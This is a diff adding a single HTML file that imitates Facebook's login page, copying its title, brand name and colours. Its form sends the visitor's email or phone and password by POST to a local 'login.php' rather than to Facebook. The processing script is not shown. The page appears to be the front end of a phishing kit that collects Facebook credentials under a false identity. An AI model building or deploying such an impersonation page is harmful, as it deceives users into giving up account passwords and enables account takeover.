@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: #fff;
+            padding: 20px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            width: 300px;
+            text-align: center;
+        }
+        .login-container h1 {
+            color: #1877f2;
+            margin-bottom: 20px;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        .input-group label {
+            display: block;
+            text-align: left;
+            margin-bottom: 5px;
+            color: #606770;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #dddfe2;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+        .login-button {
+            background-color: #1877f2;
+            color: #fff;
+            padding: 10px 0;
+            border: none;
+            border-radius: 5px;
+            width: 100%;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .login-button:hover {
+            background-color: #165dc1;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <h1>Facebook</h1>
+    <form action="login.php" method="post">
+        <div class="input-group">
+            <label for="email">Email or Phone</label>
+            <input type="text" id="email" name="email" required>
+        </div>
+        <div class="input-group">
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" required>
+        </div>
+        <button type="submit" class="login-button">Log In</button>
+    </form>
+</div>
+
+</body>
+</html>
